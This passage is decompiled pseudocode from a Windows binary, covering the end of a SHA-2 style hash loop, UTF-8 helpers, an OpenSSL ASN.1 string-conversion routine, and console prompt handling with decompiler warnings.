        result = __ROR4__(v851 ^ __ROR4__(v852, 11), 2) + v854;
        v1913 = _mm_add_epi32(_mm_load_si128(_EBP + 3), v682);
      }
      while ( _EBP[4].m128i_i32[0] != 66051 );
      v1704 = v676;
      v855 = result;
      v1540 = result;
      v856 = result ^ __ROR4__(result, 9);
      v857 = v1577 ^ result;
      v858 = v1854.m128i_i32[0]
           + v1826
           + (v676 & (v1784 ^ v1742) ^ v1784)
           + __ROR4__(v676 ^ __ROR4__(v676 ^ __ROR4__(v676, 14), 5), 6);
      v859 = __ROR4__(v855 ^ __ROR4__(v856, 11), 2) + v858 + (v1577 ^ v857 & v675);
      v860 = v1659 + v858;
      v861 = __ROR4__((v1659 + v858) ^ __ROR4__(v1659 + v858, 14), 5);
      v1663 = v860;
      v862 = (v860 & (v1742 ^ v1704) ^ v1742) + __ROR4__(v860 ^ v861, 6);
      v863 = v859;
      v1830 = v859;
      v864 = v859 ^ __ROR4__(v859, 9);
      v865 = v1540 ^ v859;
      v866 = v1854.m128i_i32[1] + v1784 + v862;
      v867 = __ROR4__(v863 ^ __ROR4__(v864, 11), 2) + v866 + (v1540 ^ v865 & v857);
      v868 = v1616 + v866;
      v869 = __ROR4__((v1616 + v866) ^ __ROR4__(v1616 + v866, 14), 5);
      v1620 = v868;
      v870 = (v868 & (v1704 ^ v1663) ^ v1704) + __ROR4__(v868 ^ v869, 6);
      v871 = v867;
      v1788 = v867;
      v872 = v867 ^ __ROR4__(v867, 9);
      v873 = v1830 ^ v867;
      v874 = v1854.m128i_i32[2] + v1742 + v870;
      v875 = __ROR4__(v871 ^ __ROR4__(v872, 11), 2) + v874 + (v1830 ^ v873 & v865);
      v876 = v1577 + v874;
      v877 = __ROR4__((v1577 + v874) ^ __ROR4__(v1577 + v874, 14), 5);
      v1581 = v876;
      v878 = (v876 & (v1663 ^ v1620) ^ v1663) + __ROR4__(v876 ^ v877, 6);
      v879 = v875;
      v1746 = v875;
      v880 = v875 ^ __ROR4__(v875, 9);
      v881 = v1788 ^ v875;
      v882 = v1854.m128i_i32[3] + v1704 + v878;
      v883 = __ROR4__(v879 ^ __ROR4__(v880, 11), 2) + v882 + (v1788 ^ v881 & v873);
      v884 = v1540 + v882;
      v885 = __ROR4__((v1540 + v882) ^ __ROR4__(v1540 + v882, 14), 5);
      v1541 = v884;
      v886 = (v884 & (v1620 ^ v1581) ^ v1620) + __ROR4__(v884 ^ v885, 6);
      v887 = v883;
      v1705 = v883;
      v888 = v883 ^ __ROR4__(v883, 9);
      v889 = v1746 ^ v883;
      v890 = v1873.m128i_i32[0] + v1663 + v886;
      v891 = __ROR4__(v887 ^ __ROR4__(v888, 11), 2) + v890 + (v1746 ^ v889 & v881);
      v892 = v1830 + v890;
      v893 = __ROR4__((v1830 + v890) ^ __ROR4__(v1830 + v890, 14), 5);
      v1831 = v892;
      v894 = (v892 & (v1581 ^ v1541) ^ v1581) + __ROR4__(v892 ^ v893, 6);
      v895 = v891;
      v1664 = v891;
      v896 = v891 ^ __ROR4__(v891, 9);
      v897 = v1705 ^ v891;
      v898 = v1873.m128i_i32[1] + v1620 + v894;
      v899 = __ROR4__(v895 ^ __ROR4__(v896, 11), 2) + v898 + (v1705 ^ v897 & v889);
      v900 = v1788 + v898;
      v901 = __ROR4__((v1788 + v898) ^ __ROR4__(v1788 + v898, 14), 5);
      v1789 = v900;
      v902 = (v900 & (v1541 ^ v1831) ^ v1541) + __ROR4__(v900 ^ v901, 6);
      v903 = v899;
      v1621 = v899;
      v904 = v899 ^ __ROR4__(v899, 9);
      v905 = v1664 ^ v899;
      v906 = v1873.m128i_i32[2] + v1581 + v902;
      v907 = __ROR4__(v903 ^ __ROR4__(v904, 11), 2) + v906 + (v1664 ^ v905 & v897);
      v908 = v1746 + v906;
      v909 = __ROR4__((v1746 + v906) ^ __ROR4__(v1746 + v906, 14), 5);
      v1747 = v908;
      v910 = (v908 & (v1831 ^ v1789) ^ v1831) + __ROR4__(v908 ^ v909, 6);
      v911 = v907;
      v1582 = v907;
      v912 = v907 ^ __ROR4__(v907, 9);
      v913 = v1621 ^ v907;
      v914 = v1873.m128i_i32[3] + v1541 + v910;
      v915 = __ROR4__(v911 ^ __ROR4__(v912, 11), 2) + v914 + (v1621 ^ v913 & v905);
      v916 = v1705 + v914;
      v917 = __ROR4__((v1705 + v914) ^ __ROR4__(v1705 + v914, 14), 5);
      v1706 = v916;
      v918 = (v916 & (v1789 ^ v1747) ^ v1789) + __ROR4__(v916 ^ v917, 6);
      v919 = v915;
      v1542 = v915;
      v920 = v915 ^ __ROR4__(v915, 9);
      v921 = v1582 ^ v915;
      v922 = v1893.m128i_i32[0] + v1831 + v918;
      v923 = __ROR4__(v919 ^ __ROR4__(v920, 11), 2) + v922 + (v1582 ^ v921 & v913);
      v924 = v1664 + v922;
      v925 = __ROR4__((v1664 + v922) ^ __ROR4__(v1664 + v922, 14), 5);
      v1665 = v924;
      v926 = (v924 & (v1747 ^ v1706) ^ v1747) + __ROR4__(v924 ^ v925, 6);
      v927 = v923;
      v1832 = v923;
      v928 = v923 ^ __ROR4__(v923, 9);
      v929 = v1542 ^ v923;
      v930 = v1893.m128i_i32[1] + v1789 + v926;
      v931 = __ROR4__(v927 ^ __ROR4__(v928, 11), 2) + v930 + (v1542 ^ v929 & v921);
      v932 = v1621 + v930;
      v933 = __ROR4__((v1621 + v930) ^ __ROR4__(v1621 + v930, 14), 5);
      v1622 = v932;
      v934 = (v932 & (v1706 ^ v1665) ^ v1706) + __ROR4__(v932 ^ v933, 6);
      v935 = v931;
      v1790 = v931;
      v936 = v931 ^ __ROR4__(v931, 9);
      v937 = v1832 ^ v931;
      v938 = v1893.m128i_i32[2] + v1747 + v934;
      v939 = __ROR4__(v935 ^ __ROR4__(v936, 11), 2) + v938 + (v1832 ^ v937 & v929);
      v940 = v1582 + v938;
      v941 = __ROR4__((v1582 + v938) ^ __ROR4__(v1582 + v938, 14), 5);
      v1583 = v940;
      v942 = (v940 & (v1665 ^ v1622) ^ v1665) + __ROR4__(v940 ^ v941, 6);
      v943 = v939;
      v1748 = v939;
      v944 = v939 ^ __ROR4__(v939, 9);
      v945 = v1790 ^ v939;
      v946 = v1893.m128i_i32[3] + v1706 + v942;
      v947 = __ROR4__(v943 ^ __ROR4__(v944, 11), 2) + v946 + (v1790 ^ v945 & v937);
      v948 = v1542 + v946;
      v949 = __ROR4__((v1542 + v946) ^ __ROR4__(v1542 + v946, 14), 5);
      v1543 = v948;
      v950 = (v948 & (v1622 ^ v1583) ^ v1622) + __ROR4__(v948 ^ v949, 6);
      v951 = v947;
      v1707 = v947;
      v952 = v947 ^ __ROR4__(v947, 9);
      v953 = v1748 ^ v947;
      v954 = v1913.m128i_i32[0] + v1665 + v950;
      v955 = __ROR4__(v951 ^ __ROR4__(v952, 11), 2) + v954 + (v1748 ^ v953 & v945);
      v956 = v1832 + v954;
      v957 = __ROR4__((v1832 + v954) ^ __ROR4__(v1832 + v954, 14), 5);
      v1833 = v956;
      v958 = (v956 & (v1583 ^ v1543) ^ v1583) + __ROR4__(v956 ^ v957, 6);
      v959 = v955;
      v1666 = v955;
      v960 = v955 ^ __ROR4__(v955, 9);
      v961 = v1707 ^ v955;
      v962 = v1913.m128i_i32[1] + v1622 + v958;
      v963 = __ROR4__(v959 ^ __ROR4__(v960, 11), 2) + v962 + (v1707 ^ v961 & v953);
      v964 = v1790 + v962;
      v965 = __ROR4__((v1790 + v962) ^ __ROR4__(v1790 + v962, 14), 5);
      v1791 = v964;
      v966 = (v964 & (v1543 ^ v1833) ^ v1543) + __ROR4__(v964 ^ v965, 6);
      v967 = v963;
      v1623 = v963;
      v968 = v963 ^ __ROR4__(v963, 9);
      v969 = v1666 ^ v963;
      v970 = v1913.m128i_i32[2] + v1583 + v966;
      v971 = __ROR4__(v967 ^ __ROR4__(v968, 11), 2) + v970 + (v1666 ^ v969 & v961);
      v972 = v1748 + v970;
      v973 = __ROR4__((v1748 + v970) ^ __ROR4__(v1748 + v970, 14), 5);
      v1749 = v972;
      v974 = (v972 & (v1833 ^ v1791) ^ v1833) + __ROR4__(v972 ^ v973, 6);
      v975 = v971;
      v976 = v971 ^ __ROR4__(v971, 9);
      v977 = v1623 ^ v971;
      v978 = v1913.m128i_i32[3] + v1543 + v974;
      result = v1933->m128i_i32[0] + __ROR4__(v975 ^ __ROR4__(v976, 11), 2) + v978 + (v1623 ^ v977 & v969);
      v979 = v1933->m128i_i32[1] + (v1623 ^ v977);
      v980 = v1933->m128i_i32[2] + v1623;
      v981 = v1933->m128i_i32[3] + v1666;
      v1933->m128i_i32[0] = result;
      v1933->m128i_i32[1] = v979;
      v1933->m128i_i32[2] = v980;
      v1933->m128i_i32[3] = v981;
      v1577 = v979;
      v675 = v980 ^ v979;
      v1616 = v980;
      v1659 = v981;
      v676 = v1933[1].m128i_i32[0] + v1707 + v978;
      v982 = v1933[1].m128i_i32[1] + v1749;
      v983 = v1933[1].m128i_i32[2] + v1791;
      v1933[1].m128i_i32[0] = v676;
      v1933[1].m128i_i32[1] = v982;
      v1742 = v982;
      v1933[1].m128i_i32[2] = v983;
      v984 = v1933[1].m128i_i32[3] + v1833;
      v1784 = v983;
      v1933[1].m128i_i32[3] = v984;
      v1826 = v984;
      v677 = v1928;
      v678 = _mm_load_si128(_EBP + 4);
      _EBP -= 12;
    }
    while ( (unsigned int)v1928 < v1931 );
  }
  return result;
}
// 46C826: positive sp value E8 has been found
// 46C544: variable 'v1933' is possibly undefined
// 46C548: variable 'v1934' is possibly undefined
// 46C564: variable 'v1935' is possibly undefined
// 46C701: variable 'v1937' is possibly undefined
// 46C737: variable 'v1932' is possibly undefined
// 46C72D: variable 'v1938' is possibly undefined
// 46C79F: variable 'v1936' is possibly undefined
// 46C7B7: variable 'v1939' is possibly undefined
// 46C7E8: variable 'v1940' is possibly undefined
// 46C818: variable 'v1941' is possibly undefined
// 46C840: using guessed type int SHA512_Constants_46C840[68];
// 73C6D0: using guessed type int dword_73C6D0;

//----- (004719F0) --------------------------------------------------------
int __cdecl sub_4719F0(char *a1, int a2, _DWORD *a3)
{
  int result; // eax
  char v4; // cl
  char v5; // dl
  unsigned int v6; // ecx
  unsigned int v7; // ecx
  char v8; // al
  unsigned int v9; // ecx
  char v10; // al
  unsigned int v11; // ecx
  _BYTE *v12; // esi
  char v13; // al
  unsigned int v14; // ecx

  if ( a2 <= 0 )
    return 0;
  v4 = *a1;
  if ( *a1 >= 0 )
  {
    result = 1;
    *a3 = v4 & 0x7F;
    return result;
  }
  if ( (v4 & 0xE0) != 0xC0 )
  {
    if ( (v4 & 0xF0) == 0xE0 )
    {
      if ( a2 < 3 )
        return -1;
      if ( (a1[1] & 0xC0) == 0x80 && (a1[2] & 0xC0) == 0x80 )
      {
        v7 = a1[2] & 0x3F | ((a1[1] & 0x3F) << 6) | ((v4 & 0xF) << 12);
        if ( v7 >= 0x800 )
        {
          result = 3;
          *a3 = v7;
          return result;
        }
        return -4;
      }
      return -3;
    }
    if ( (v4 & 0xF8) == 0xF0 )
    {
      if ( a2 < 4 )
        return -1;
      if ( (a1[1] & 0xC0) != 0x80 )
        return -3;
      v8 = a1[2] & 0xC0;
      if ( v8 != (char)0x80 || (a1[3] & 0xC0) != v8 )
        return -3;
      v9 = a1[3] & 0x3F | ((a1[2] & 0x3F) << 6) | ((a1[1] & 0x3F) << 12) | ((v4 & 7) << 18);
      if ( v9 >= 0x10000 )
      {
        result = 4;
        *a3 = v9;
        return result;
      }
    }
    else if ( (v4 & 0xFC) == 0xF8 )
    {
      if ( a2 < 5 )
        return -1;
      if ( (a1[1] & 0xC0) != 0x80 )
        return -3;
      if ( (a1[2] & 0xC0) != 0x80 )
        return -3;
      v10 = a1[3] & 0xC0;
      if ( v10 != (char)0x80 || (a1[4] & 0xC0) != v10 )
        return -3;
      v11 = a1[4] & 0x3F | ((a1[3] & 0x3F) << 6) | ((a1[2] & 0x3F) << 12) | ((a1[1] & 0x3F) << 18) | ((v4 & 3) << 24);
      if ( v11 >= 0x200000 )
      {
        result = 5;
        *a3 = v11;
        return result;
      }
    }
    else
    {
      if ( (v4 & 0xFE) != 0xFC )
        return -2;
      if ( a2 < 6 )
        return -1;
      if ( (a1[1] & 0xC0) != 0x80 )
        return -3;
      if ( (a1[2] & 0xC0) != 0x80 )
        return -3;
      if ( (a1[3] & 0xC0) != 0x80 )
        return -3;
      v13 = a1[4] & 0xC0;
      if ( v13 != (char)0x80 || (a1[5] & 0xC0) != v13 )
        return -3;
      v12 = a1 + 1;
      v14 = v12[4] & 0x3F | ((v12[3] & 0x3F) << 6) | ((v12[2] & 0x3F) << 12) | ((v12[1] & 0x3F) << 18) | ((*v12 & 0x3F) << 24) | ((v4 & 1) << 30);
      if ( v14 >= 0x4000000 )
      {
        result = 6;
        *a3 = v14;
        return result;
      }
    }
    return -4;
  }
  if ( a2 < 2 )
    return -1;
  v5 = a1[1];
  if ( (v5 & 0xC0) != 0x80 )
    return -3;
  v6 = v5 & 0x3F | ((v4 & 0x1F) << 6);
  if ( v6 < 0x80 )
    return -4;
  result = 2;
  *a3 = v6;
  return result;
}

//----- (00471CA0) --------------------------------------------------------
int __cdecl sub_471CA0(_BYTE *a1, int a2, unsigned int a3)
{
  int v3; // edx

  if ( a1 )
  {
    v3 = a2;
    if ( a2 <= 0 )
      return -1;
  }
  else
  {
    v3 = 6;
  }
  if ( a3 < 0x80 )
  {
    if ( a1 )
      *a1 = a3;
    return 1;
  }
  if ( a3 < 0x800 )
  {
    if ( v3 >= 2 )
    {
      if ( a1 )
      {
        *a1 = (a3 >> 6) & 0x1F | 0xC0;
        a1[1] = a3 & 0x3F | 0x80;
      }
      return 2;
    }
    return -1;
  }
  if ( a3 >= 0x10000 )
  {
    if ( a3 >= 0x200000 )
    {
      if ( a3 >= 0x4000000 )
      {
        if ( v3 < 6 )
          return -1;
        if ( a1 )
        {
          *a1 = ((a3 & 0x40000000) != 0) | 0xFC;
          a1[1] = HIBYTE(a3) & 0x3F | 0x80;
          a1[2] = (a3 >> 18) & 0x3F | 0x80;
          a1[3] = (a3 >> 12) & 0x3F | 0x80;
          a1[4] = (a3 >> 6) & 0x3F | 0x80;
          a1[5] = a3 & 0x3F | 0x80;
        }
        return 6;
      }
      else
      {
        if ( v3 < 5 )
          return -1;
        if ( a1 )
        {
          *a1 = HIBYTE(a3) & 3 | 0xF8;
          a1[1] = (a3 >> 18) & 0x3F | 0x80;
          a1[2] = (a3 >> 12) & 0x3F | 0x80;
          a1[3] = (a3 >> 6) & 0x3F | 0x80;
          a1[4] = a3 & 0x3F | 0x80;
        }
        return _RTC_NumErrors_3();
      }
    }
    else
    {
      if ( v3 < 4 )
        return -1;
      if ( a1 )
      {
        *a1 = (a3 >> 18) & 7 | 0xF0;
        a1[1] = (a3 >> 12) & 0x3F | 0x80;
        a1[2] = (a3 >> 6) & 0x3F | 0x80;
        a1[3] = a3 & 0x3F | 0x80;
      }
      return _RTC_NumErrors_2();
    }
  }
  else
  {
    if ( v3 < 3 )
      return -1;
    if ( a1 )
    {
      *a1 = (a3 >> 12) & 0xF | 0xE0;
      a1[1] = (a3 >> 6) & 0x3F | 0x80;
      a1[2] = a3 & 0x3F | 0x80;
    }
    return 3;
  }
}

//----- (00471E40) --------------------------------------------------------
int __usercall sub_471E40@<eax>(
        unsigned __int8 *a1@<edx>,
        int a2@<ecx>,
        int (__cdecl *a3)(unsigned int C, int *a2)@<ebx>,
        int a4,
        int *a5)
{
  int v5; // edi
  int v7; // eax
  int v8; // eax
  unsigned __int8 *v9; // esi
  int v10; // edx
  unsigned __int8 *v11; // esi
  int v12; // ecx
  int v13; // eax
  int result; // eax
  int v15; // [esp+Ch] [ebp-4h] BYREF

  v5 = a2;
  while ( v5 )
  {
    switch ( a4 )
    {
      case 4097:
        v7 = *a1++;
        v15 = v7;
        --v5;
        break;
      case 4098:
        v8 = *a1 << 8;
        v9 = a1 + 1;
        v15 = v8;
        v7 = *v9 | v8;
        a1 = v9 + 1;
        v15 = v7;
        v5 -= 2;
        break;
      case 4100:
        v15 = *a1 << 24;
        v10 = a1[1];
        v11 = a1 + 1;
        v15 |= v10 << 16;
        v12 = v11[1] << 8;
        v11 += 2;
        v15 |= v12;
        v7 = *v11 | v15;
        a1 = v11 + 1;
        v15 = v7;
        v5 -= 4;
        break;
      default:
        v13 = sub_4719F0((char *)a1, v5, &v15);
        if ( v13 < 0 )
          return -1;
        v5 -= v13;
        a1 += v13;
        v7 = v15;
        break;
    }
    if ( a3 )
    {
      result = a3(v7, a5);
      if ( result <= 0 )
        return result;
    }
  }
  return 1;
}

//----- (00471F20) --------------------------------------------------------
int __cdecl sub_471F20(int a1, _DWORD *a2)
{
  ++*a2;
  return 1;
}

//----- (00471F70) --------------------------------------------------------
int __cdecl sub_471F70(__int16 a1, _BYTE **a2)
{
  _BYTE *v2; // ecx

  v2 = *a2;
  *v2 = HIBYTE(a1);
  v2[1] = a1;
  *a2 += 2;
  return 1;
}

//----- (00471FF0) --------------------------------------------------------
BOOL __cdecl sub_471FF0(int Val)
{
  return (unsigned int)Val <= 0x7F
      && (Val >= 97 && Val <= 122
       || Val >= 65 && Val <= 90
       || Val >= 48 && Val <= 57
       || Val == 32
       || strchr("'()+,-./:=?", Val));
}

//----- (00472040) --------------------------------------------------------
int __cdecl sub_472040(unsigned int C, int *a2)
{
  int v2; // ebx

  v2 = *a2;
  if ( (*a2 & 1) != 0 && (C > 0x7F || !isdigit(C) && C != 32) )
    v2 &= ~1u;
  if ( (v2 & 2) != 0 && !sub_471FF0(C) )
    v2 &= ~2u;
  if ( (v2 & 0x10) != 0 && C > 0x7F )
    v2 &= ~0x10u;
  if ( (v2 & 4) != 0 && C > 0xFF )
    v2 &= ~4u;
  if ( (v2 & 0x800) != 0 && C > 0xFFFF )
    v2 &= ~0x800u;
  if ( !v2 )
    return -1;
  *a2 = v2;
  return 1;
}

//----- (004720D0) --------------------------------------------------------
int __cdecl sub_4720D0(int *a1, char *a2, signed int Size, int a4, int a5, int a6, int a7)
{
  int v7; // eax
  char *v8; // edi
  int v9; // ebp
  int v10; // esi
  int v11; // eax
  int v12; // esi
  int v13; // esi
  int v14; // edi
  int *v15; // ebx
  int v16; // esi
  _DWORD *v17; // eax
  int v18; // ebx
  unsigned __int8 *v19; // edx
  char v21; // [esp+13h] [ebp-3Dh]
  int v22; // [esp+14h] [ebp-3Ch] BYREF
  int v23; // [esp+18h] [ebp-38h] BYREF
  int (__cdecl *v24)(unsigned int, int *); // [esp+1Ch] [ebp-34h]
  void *Src; // [esp+20h] [ebp-30h]
  _BYTE *v26; // [esp+24h] [ebp-2Ch] BYREF
  int *v27; // [esp+28h] [ebp-28h]
  char v28[32]; // [esp+2Ch] [ebp-24h] BYREF

  v27 = a1;
  v7 = Size;
  v8 = a2;
  Src = a2;
  v22 = 0;
  v24 = 0;
  if ( Size == -1 )
  {
    v7 = strlen(a2);
    Size = v7;
  }
  if ( !a5 )
    a5 = 10246;
  switch ( a4 )
  {
    case 4096:
      v9 = 0;
      v10 = v7;
      if ( !v7 )
        goto LABEL_20;
      do
      {
        v11 = sub_4719F0(v8, v10, &v23);
        if ( v11 < 0 )
        {
          sub_408310(13, 122, 134, (int)"crypto\\asn1\\a_mbstr.c", 87);
          return -1;
        }
        v10 -= v11;
        v8 += v11;
        if ( sub_471F20 )
          ++v9;
      }
      while ( v10 );
      goto LABEL_20;
    case 4097:
      v9 = v7;
      goto LABEL_20;
    case 4098:
      if ( (v7 & 1) != 0 )
      {
        sub_408310(13, 122, 129, (int)"crypto\\asn1\\a_mbstr.c", 67);
        return -1;
      }
      v9 = v7 >> 1;
      goto LABEL_20;
    case 4100:
      if ( (v7 & 3) != 0 )
      {
        sub_408310(13, 122, 133, (int)"crypto\\asn1\\a_mbstr.c", 76);
      }
      else
      {
        v9 = v7 >> 2;
LABEL_20:
        v12 = a6;
        if ( a6 <= 0 || v9 >= a6 )
        {
          v13 = a7;
          if ( a7 <= 0 || v9 <= a7 )
          {
            if ( sub_471E40((unsigned __int8 *)Src, Size, sub_472040, a4, &a5) >= 0 )
            {
              v23 = 4097;
              if ( (a5 & 1) != 0 )
              {
                v14 = 18;
              }
              else if ( (a5 & 2) != 0 )
              {
                v14 = 19;
              }
              else if ( (a5 & 0x10) != 0 )
              {
                v14 = 22;
              }
              else if ( (a5 & 4) != 0 )
              {
                v14 = 20;
              }
              else if ( (a5 & 0x800) != 0 )
              {
                v14 = 30;
                v23 = 4098;
              }
              else if ( (a5 & 0x100) != 0 )
              {
                v14 = 28;
                v23 = 4100;
              }
              else
              {
                v14 = 12;
                v23 = 4096;
              }
              v15 = v27;
              if ( v27 )
              {
                v16 = *v27;
                if ( *v27 )
                {
                  v21 = 0;
                  sub_413490(*(void **)(v16 + 8));
                  *(_DWORD *)(v16 + 8) = 0;
                  *(_DWORD *)v16 = 0;
                  *(_DWORD *)(v16 + 4) = v14;
                }
                else
                {
                  v21 = 1;
                  v17 = sub_4329F0(v14);
                  v16 = (int)v17;
                  if ( !v17 )
                  {
                    sub_408310(13, 122, 65, (int)"crypto\\asn1\\a_mbstr.c", 154);
                    return -1;
                  }
                  *v15 = (int)v17;
                }
                v18 = a4;
                if ( a4 == v23 )
                {
                  if ( !sub_432910(v16, (const char *)Src, Size) )
                  {
                    sub_408310(13, 122, 65, (int)"crypto\\asn1\\a_mbstr.c", 162);
                    return -1;
                  }
                }
                else
                {
                  switch ( v23 )
                  {
                    case 4096:
                      v22 = 0;
                      sub_471E40(
                        (unsigned __int8 *)Src,
                        Size,
                        (int (__cdecl *)(unsigned int, int *))sub_471F30,
                        a4,
                        &v22);
                      v18 = a4;
                      v24 = (int (__cdecl *)(unsigned int, int *))sub_471FC0;
                      break;
                    case 4097:
                      v22 = v9;
                      v24 = (int (__cdecl *)(unsigned int, int *))sub_471F50;
                      break;
                    case 4098:
                      v22 = 2 * v9;
                      v24 = (int (__cdecl *)(unsigned int, int *))sub_471F70;
                      break;
                    case 4100:
                      v22 = 4 * v9;
                      v24 = (int (__cdecl *)(unsigned int, int *))sub_471F90;
                      break;
                    default:
                      break;
                  }
                  v26 = sub_4133F0(v22 + 1);
                  if ( !v26 )
                  {
                    if ( v21 )
                      sub_432A30((void **)v16);
                    sub_408310(13, 122, 65, (int)"crypto\\asn1\\a_mbstr.c", 194);
                    return -1;
                  }
                  *(_DWORD *)v16 = v22;
                  *(_DWORD *)(v16 + 8) = v26;
                  v19 = (unsigned __int8 *)Src;
                  v26[v22] = 0;
                  sub_471E40(v19, Size, v24, v18, (int *)&v26);
                }
              }
              return v14;
            }
            sub_408310(13, 122, 124, (int)"crypto\\asn1\\a_mbstr.c", 117);
          }
          else
          {
            sub_408310(13, 122, 151, (int)"crypto\\asn1\\a_mbstr.c", 109);
            sub_4191B0((int)v28, 32, "%ld", v13);
            sub_408610(2, "maxsize=", v28);
          }
        }
        else
        {
          sub_408310(13, 122, 152, (int)"crypto\\asn1\\a_mbstr.c", 102);
          sub_4191B0((int)v28, 32, "%ld", v12);
          sub_408610(2, "minsize=", v28);
        }
      }
      return -1;
    default:
      sub_408310(13, 122, 160, (int)"crypto\\asn1\\a_mbstr.c", 97);
      return -1;
  }
}
// 471F30: using guessed type int sub_471F30();
// 471F50: using guessed type int sub_471F50();
// 471F90: using guessed type int sub_471F90();
// 471FC0: using guessed type int sub_471FC0();

//----- (004724F0) --------------------------------------------------------
int __cdecl sub_4724F0(int *a1, char *a2, signed int Size, int a4, int a5)
{
  return sub_4720D0(a1, a2, Size, a4, a5, 0, 0);
}

//----- (00472520) --------------------------------------------------------
char **sub_472520()
{
  return &off_5353CC;
}
// 5353CC: using guessed type char *off_5353CC;

//----- (00472530) --------------------------------------------------------
int __cdecl sub_472530(int a1, int a2)
{
  const char *v2; // eax
  FILE *v4; // [esp-4h] [ebp-8h]

  if ( (unsigned int)(sub_445DB0(a2) - 4) <= 1 )
  {
    v4 = dword_5392AC;
    v2 = (const char *)sub_445DD0(a2);
    fputs(v2, v4);
    fflush(dword_5392AC);
  }
  return 1;
}

//----- (00472580) --------------------------------------------------------
int sub_472580()
{
  FILE *v1; // [esp+0h] [ebp-10h]
  char Buffer[8]; // [esp+4h] [ebp-Ch] BYREF

  while ( fgets(Buffer, 4, v1) )
  {
    if ( strchr(Buffer, 10) )
      return 1;
  }
  return 0;
}
// 47259D: variable 'v1' is possibly undefined

//----- (004725E0) --------------------------------------------------------
int __cdecl sub_4725E0(int a1)
{
  HANDLE StdHandle; // eax

  sub_414690(*(LPCRITICAL_SECTION *)(a1 + 20));
  dword_5392A4 = 1;
  dword_5392AC = fopen("conout$", "w");
  if ( !dword_5392AC )
    dword_5392AC = (FILE *)(sub_4DA3E6() + 16);
  StdHandle = GetStdHandle(0xFFFFFFF6);
  if ( GetConsoleMode(StdHandle, &dword_539338) || (dword_5392A4 = 0, (Stream = fopen("conin$", "r")) == 0) )
    Stream = (FILE *)sub_4DA3E6();
  return 1;
}
// 5392A4: using guessed type int dword_5392A4;

//----- (00472670) --------------------------------------------------------
int __cdecl sub_472670(int a1)
{
  if ( Stream != (FILE *)sub_4DA3E6() )
    fclose(Stream);
  if ( dword_5392AC != (FILE *)(sub_4DA3E6() + 16) )
    fclose(dword_5392AC);
  sub_4146B0(*(LPCRITICAL_SECTION *)(a1 + 20));
  return 1;
}

//----- (004726C0) --------------------------------------------------------
_crt_signal_t sub_4726C0()
{
  signal(22, Function);
  signal(8, dword_5392D8);
  signal(4, dword_5392C8);
  signal(2, dword_5392C0);
  signal(11, dword_5392E4);
  return signal(15, dword_5392F4);
}

//----- (00472720) --------------------------------------------------------
void __cdecl sub_472720(int a1)
{
  dword_5392B4 = a1;
}
// 5392B4: using guessed type int dword_5392B4;

//----- (00472730) --------------------------------------------------------
void (__cdecl *sub_472730())(int)
{
  void (__cdecl *result)(int); // eax

  Function = signal(22, sub_472720);
  dword_5392D8 = signal(8, sub_472720);
  dword_5392C8 = signal(4, sub_472720);
  dword_5392C0 = signal(2, sub_472720);
  dword_5392E4 = signal(11, sub_472720);
  result = signal(15, sub_472720);
  dword_5392F4 = result;
  return result;
}

//----- (004727A0) --------------------------------------------------------
int __usercall sub_4727A0@<eax>(int a1@<edi>, int a2, int a3, int a4)
{
  CHAR *v4; // esi
  HANDLE StdHandle; // eax
  HANDLE v6; // eax
  DWORD v7; // eax
  HANDLE v8; // eax
  DWORD v9; // eax
  char *v10; // eax
  HANDLE v11; // eax
  DWORD v13; // [esp-4h] [ebp-624h]
  DWORD v14; // [esp-4h] [ebp-624h]
  DWORD NumberOfCharsRead; // [esp+Ch] [ebp-614h] BYREF
  int v16; // [esp+10h] [ebp-610h]
  int v17; // [esp+14h] [ebp-60Ch]
  BOOL v18; // [esp+18h] [ebp-608h]
  CHAR MultiByteStr[512]; // [esp+1Ch] [ebp-604h] BYREF
  WCHAR Buffer[512]; // [esp+21Ch] [ebp-404h] BYREF

  v4 = 0;
  v17 = a3;
  dword_5392B4 = 0;
  v16 = 0;
  dword_5392A8 = 0;
  v18 = a1 == 0;
  sub_472730();
  dword_5392A8 = 1;
  if ( !a1 && dword_5392A4 )
  {
    v13 = dword_539338 & 0xFFFFFFFB;
    dword_5392A0 = dword_539338 & 0xFFFFFFFB;
    StdHandle = GetStdHandle(0xFFFFFFF6);
    SetConsoleMode(StdHandle, v13);
  }
  dword_5392A8 = 2;
  MultiByteStr[0] = 0;
  if ( dword_5392A4 )
  {
    if ( !GetEnvironmentVariableW(&Name, 0, 0) )
    {
      v8 = GetStdHandle(0xFFFFFFF6);
      if ( !ReadConsoleA(v8, MultiByteStr, 0x1FFu, &NumberOfCharsRead, 0) )
        goto LABEL_30;
      v9 = NumberOfCharsRead;
      if ( NumberOfCharsRead >= 2
        && MultiByteStr[NumberOfCharsRead - 2] == 13
        && MultiByteStr[NumberOfCharsRead - 1] == 10 )
      {
        MultiByteStr[NumberOfCharsRead - 2] = 10;
        NumberOfCharsRead = --v9;
      }
      MultiByteStr[v9] = 0;
      goto LABEL_22;
    }
    v6 = GetStdHandle(0xFFFFFFF6);
    if ( !ReadConsoleW(v6, Buffer, 0x1FFu, &NumberOfCharsRead, 0) )
      goto LABEL_30;
    v7 = NumberOfCharsRead;
    if ( NumberOfCharsRead >= 2
      && *(_WORD *)&MultiByteStr[2 * NumberOfCharsRead + 508] == 13
      && *(_WORD *)&MultiByteStr[2 * NumberOfCharsRead + 510] == 10 )
    {
      *(_WORD *)&MultiByteStr[2 * NumberOfCharsRead + 508] = 10;
      NumberOfCharsRead = --v7;
    }
    Buffer[v7] = 0;
    if ( WideCharToMultiByte(0xFDE9u, 0, Buffer, -1, MultiByteStr, 512, 0, 0) > 0 )
      v4 = MultiByteStr;
    sub_4139E0(Buffer, 0x400u);
  }
  else
  {
    v4 = fgets(MultiByteStr, 511, Stream);
  }
  if ( !v4 )
    goto LABEL_30;
LABEL_22:
  if ( !feof(Stream) && !ferror(Stream) )
  {
    v10 = strchr(MultiByteStr, 10);
    if ( v10 )
    {
      if ( a4 )
        *v10 = 0;
    }
    else if ( !sub_472580() )
    {
      goto LABEL_30;
    }
    if ( sub_445E40(a2, v17, MultiByteStr) >= 0 )
      v16 = 1;
  }
LABEL_30:
  if ( dword_5392B4 == 2 )
    v16 = -1;
  if ( v18 )
    fprintf(dword_5392AC, "\n");
  if ( dword_5392A8 >= 2 && !a1 && dword_5392A4 )
  {
    v14 = dword_539338 | 4;
    dword_5392A0 = dword_539338 | 4;
    v11 = GetStdHandle(0xFFFFFFF6);
    SetConsoleMode(v11, v14);
  }
  if ( dword_5392A8 >= 1 )
    sub_4726C0();
  sub_4139E0(MultiByteStr, 0x200u);
  return v16;
}
